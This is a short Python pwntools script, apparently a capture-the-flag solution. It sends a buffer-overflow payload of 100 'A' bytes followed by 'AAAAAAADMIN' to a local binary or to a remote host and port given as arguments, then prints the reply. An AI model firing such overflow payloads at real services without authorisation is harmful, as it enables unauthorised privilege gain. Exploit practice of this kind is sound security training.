from pwn import *
import sys

if len(sys.argv) ==3 :
    host = sys.argv[1]
    port = int(sys.argv[2])
    s = remote(host, port)
else: 
    s = process('./src/main')
s.sendline(b'A'*100+b"AAAAAAADMIN")
d = s.recv(1024)
print(d)

s.close()